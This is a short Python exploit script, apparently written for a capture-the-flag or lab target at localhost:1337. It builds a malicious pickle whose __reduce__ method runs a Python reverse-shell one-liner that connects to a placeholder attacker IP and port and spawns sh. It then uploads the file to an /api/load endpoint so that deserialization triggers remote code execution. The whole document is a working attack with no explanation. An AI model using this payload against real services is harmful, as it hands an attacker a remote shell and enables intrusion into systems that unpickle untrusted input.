import requests
import pickle
import os
import sys

class Rce:
	def __reduce__(self):
		c = ("""python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<Your_IP>","<port>"));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'""")
		return os.system,(c,)

f = open("rce.pkl","wb")

pickle.dump(Rce(),f)

requests.post("http://localhost:1337/api/load",files={'file': ('rce.pkl',open('rce.pkl','rb'))})
